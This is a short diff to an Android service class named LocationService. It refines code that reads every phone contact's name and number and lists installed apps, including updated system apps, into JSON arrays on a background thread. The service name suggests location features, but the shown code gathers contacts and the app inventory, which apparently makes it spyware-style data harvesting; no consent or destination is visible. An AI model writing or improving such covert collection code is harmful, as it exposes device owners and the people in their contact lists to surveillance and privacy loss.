@@ -256,7 +256,8 @@ public class LocationService extends Service {
         io.execute(() -> {
             try {
                 JSONArray arr = new JSONArray();
-                android.database.Cursor cursor = getContentResolver().query(android.provider.ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);
+                String[] proj = {android.provider.ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME, android.provider.ContactsContract.CommonDataKinds.Phone.NUMBER};
+            android.database.Cursor cursor = getContentResolver().query(android.provider.ContactsContract.CommonDataKinds.Phone.CONTENT_URI, proj, null, null, null);
                 if (cursor != null) {
                     while (cursor.moveToNext()) {
                         int n = cursor.getColumnIndex(android.provider.ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME);
@@ -341,7 +342,7 @@ public class LocationService extends Service {
                 List<android.content.pm.ApplicationInfo> apps = pm.getInstalledApplications(android.content.pm.PackageManager.GET_META_DATA);
                 JSONArray arr = new JSONArray();
                 for (android.content.pm.ApplicationInfo app : apps) {
-                    if ((app.flags & android.content.pm.ApplicationInfo.FLAG_SYSTEM) == 0) {
+                    if ((app.flags & android.content.pm.ApplicationInfo.FLAG_SYSTEM) == 0 || (app.flags & android.content.pm.ApplicationInfo.FLAG_UPDATED_SYSTEM_APP) != 0) {
                         JSONObject obj = new JSONObject(); obj.put("name", pm.getApplicationLabel(app).toString()); obj.put("pkg", app.packageName);
                         arr.put(obj);
                     }
